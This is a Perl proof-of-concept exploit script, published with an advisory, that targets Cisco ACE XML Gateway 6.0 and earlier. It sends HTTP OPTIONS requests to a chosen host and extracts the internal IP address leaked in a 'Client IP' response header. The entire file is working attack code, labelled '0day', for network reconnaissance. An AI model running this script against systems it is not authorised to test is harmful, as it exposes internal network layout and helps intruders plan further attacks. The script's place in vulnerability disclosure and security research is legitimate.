#!/usr/bin/perl -w
#
# Cisco ACE XML Gateway <= 6.0
# Internal IP Address Disclosure
#
# -=- PRIV8 -=- 0day -=- PRIV8 -=- 0day -=- PRIV8 -=-
#
# -[nitr�us]-  [ Alejandro Hernandez H. ]
# nitrousenador -at- gmail -dot- com
# http://www.brainoverflow.org
#
# Mexic� / 25-Aug-2��9
#
# -=- PUBLIC NOW -=-
# Published on September 24th, 2009
#
# ADVISORY: http://www.brainoverflow.org/advisories/cisco_ace_xml_gw_ip_disclosure.txt
#

use strict;
use Socket qw/ :DEFAULT :crlf /;	# $CRLF

use IO::Socket;

sub header
{

	print "  .+==================================+.\n";
	print " /     Cisco ACE XML Gateway <= 6.0     \\\n";
	print "|     Internal IP Address Disclosure     |\n";
	print "|                                        |\n";
	print " \\             -nitr0us-                /\n";
	print "  `+==================================+`\n\n";

}

sub usage
{

	header;
	print "Usage: $0 <host> [port(default 80)]\n";
	exit 0xdead;


}

my $host = shift || usage;
my $port = shift || 80;
my $axg;
my $axg_response;
my @payloads = ("OPTIONS / HTTP/1.0" . $CRLF . $CRLF, 
				"OPTIONS / HTTP/1.1" . $CRLF . "Host: " . $host . $CRLF . $CRLF);


header;
print "[+] Connecting to $host on port $port ...\n";

for(@payloads){

	$axg = IO::Socket::INET->new(	PeerAddr	=>	$host,
									PeerPort	=>	$port,
									Proto		=>	'tcp')
		or die "[-] Could not create socket: $!\n";

	print "[+] Sending payload  ...\n";
	print $axg $_;

	$axg->read($axg_response, 1024);
	print "[+] Parsing response ...\n";

	if($axg_response =~ /Client IP: (.*)/){
		print "[+] Internal IP disclosure: $1\n";
		$axg->close();
		exit 0xbabe;
	}

	$axg->close();


}

print "[-] Not vulnerable !\n"; 
